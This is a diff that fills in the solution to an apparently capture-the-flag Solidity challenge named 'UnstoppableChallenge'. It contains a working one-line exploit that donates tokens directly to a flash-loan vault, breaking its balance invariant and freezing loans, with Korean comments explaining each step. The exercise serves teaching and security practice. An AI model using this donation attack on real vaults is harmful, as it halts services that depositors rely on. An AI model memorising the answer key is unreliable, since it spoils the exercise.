@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // 토큰 기부로 flashloan에서의 불변식을 위배하는 상황 유발
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
@@ -102,6 +103,7 @@ contract UnstoppableChallenge is Test {
         vm.prank(deployer);
         vm.expectEmit();
         emit UnstoppableMonitor.FlashLoanStatus(false);
+        // monitor contract가 flashloan이 정말 막혔는지 체크
         monitorContract.checkFlashLoan(100e18);
 
         // And now the monitor paused the vault and transferred ownership to deployer
